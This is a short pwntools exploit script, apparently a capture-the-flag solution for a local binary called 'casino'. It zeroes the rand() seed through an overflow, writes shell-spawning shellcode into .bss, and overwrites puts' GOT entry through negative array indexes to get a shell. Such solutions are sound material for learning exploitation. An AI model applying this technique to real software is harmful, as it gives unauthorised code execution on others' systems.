from pwn import *
context.arch = 'amd64'

p = process("./casino")

name = b'a'*16
seed = b'\x00\x00\x00\x00'
age = b'32'
bss = 0x602110
payload1 = name + seed + b'a'*12 + asm(shellcraft.sh())     #overwrite the seed of rand and write shellcode in the bss
p.sendlineafter(': ', payload1)
p.sendlineafter(': ', age)

# write wrong answer so that we can use change number to do GOT Hijacking again
for i in range(6):
    p.sendlineafter(': ', '0')

# write puts' GOT high 4 byte to 0
p.sendlineafter('no]: ', '1')
p.sendlineafter(': ', '-42')
p.sendlineafter(': ', '0')

# because seed is write to 0 so that rand() will generate same number
guess = [83, 86, 77, 15, 93, 35]
for i in range(6):
    p.sendlineafter(': ', str(guess[i]))

#write put's GOT to bss where shellcode is there
p.sendlineafter('no]: ', '1')
p.sendlineafter(': ', '-43')
p.sendlineafter(': ', str(bss))

p.interactive()
